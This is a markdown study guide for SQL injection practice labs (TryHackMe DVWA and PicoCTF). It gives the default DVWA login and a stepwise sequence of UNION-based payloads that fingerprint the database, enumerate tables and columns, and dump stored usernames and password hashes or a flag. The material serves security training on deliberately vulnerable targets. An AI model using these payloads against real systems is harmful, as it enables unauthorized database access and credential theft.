# TryHackMe.com signup
https://tryhackme.com/signup
## TryHackMe SQL Injection room
https://tryhackme.com/r/room/sqlinjectionlm
## TryHackMe DVWA Room
https://tryhackme.com/r/room/dvwa
### DVWA Username and Password
username: admin
password: password
### 1: Adjust DVWA Security
Click on the DVWA Security Button at the bottom-left, then set the security to 'low', then click on 'Submit'.
### 2: Click on the SQL Injection button on the side menu
The button that isn't labelled "Blind".
### 3: Follow these steps to perform the UNION-based SQL injection attack
```
'
```
1 This confirms that there is SQL injection potential on the app, and it also identifies the DBMS system (MySQL)
```
' UNION SELECT null --
```
2 This lets us test if there is one column in the original statement. An error message is returned, so we know it isn't one column.
```
' UNION SELECT null, null -- 
```
3 An error message is not returned with two columns, so this is the number of columns going forward.
```
' UNION SELECT null,version() --
```
4 This is a function specific to MySQL and MariaDB, so we can confirm that this is the DBMS used here.
```
' UNION SELECT null,database() --
```
5 This lets us ID the name of the current database.
```
' UNION SELECT null, table_name from information_schema.tables where table_schema = 'dvwa' -- 
```
6 This lets us return all of the tables in the current database. Note that this syntax is specific to MySQL / MariaDB.
```
' UNION SELECT null, column_name from information_schema.columns where table_schema = 'dvwa' AND table_name='guestbook' -- 
```
7 This allows us to get column names for individual tables.
```
' UNION SELECT null, column_name from information_schema.columns where table_schema = 'dvwa' AND table_name='users' -- 
```
8 And this lets us get the columns for the other table
```
' UNION SELECT user,password from users -- 
```
9 And finally, we use SQL injection to get web app credentials for other users

# PicoCTF Challenges
## More SQLi (UNION SELECT SQL injection)
https://play.picoctf.org/practice/challenge/358?category=1&page=1&search=sql
### Completion Guide
```
Algiers' UNION SELECT null, null, null -- 
```
1 This lets us determine what tables exist in the database
```
Algiers' UNION SELECT null, null, name FROM sqlite_master WHERE type='table' -- 
```
2 This lets us determine which tables exist in our current database
```
Algiers' UNION SELECT null, null, name FROM PRAGMA_table_info('more_table') -- 
```
3 This lets us determine which columns exist in our target table "more_table"
```
Algiers' UNION SELECT null, null, flag FROM more_table -- 
```
4 This lets us get the flag column contents from the more_table table.

#### YouTube walkthrough
https://youtu.be/OLyKnDLuPLs

## SQLiLite (SQL Injection Login Bypass)
https://play.picoctf.org/practice/challenge/304?page=1&search=sql
#### YouTube walkthrough
https://youtu.be/39ExvhlIay4

